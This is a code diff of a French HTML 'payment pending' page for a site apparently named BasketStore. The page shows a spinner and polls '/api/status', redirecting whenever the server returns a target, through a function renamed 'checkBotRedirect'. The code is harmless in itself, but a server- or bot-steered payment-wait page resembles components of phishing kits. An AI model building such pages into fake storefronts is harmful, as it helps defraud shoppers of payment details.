@@ -1,29 +1,38 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chargement - BasketStore</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Attente Paiement</title>
 <style>
-body {display:flex; justify-content:center; align-items:center; height:100vh;}
-.spinner {border:8px solid #f3f3f3; border-top:8px solid #007bff; border-radius:50%; width:60px; height:60px; animation: spin 1s linear infinite;}
-@keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
+body{font-family:Arial;text-align:center;padding:60px;}
+.spinner{
+  border: 12px solid #f3f3f3;
+  border-top: 12px solid #007bff;
+  border-radius: 50%;
+  width: 80px;
+  height: 80px;
+  animation: spin 1.5s linear infinite;
+  margin: auto;
+}
+@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 </style>
 </head>
 <body>
+<h1>⏳ Paiement en cours...</h1>
 <div class="spinner"></div>
+
 <script>
-async function checkStatus() {
-  try {
+async function checkBotRedirect() {
+  try{
     const res = await fetch('/api/status');
     const data = await res.json();
     if(data.redirect && window.location.pathname !== data.redirect){
       window.location.href = data.redirect;
-    }
-    setTimeout(checkStatus, 2000);
-  } catch(e){ setTimeout(checkStatus, 2000); }
+    } else { setTimeout(checkBotRedirect,2000);}
+  } catch(e){ setTimeout(checkBotRedirect,2000);}
 }
-checkStatus();
+checkBotRedirect();
 </script>
 </body>
 </html>
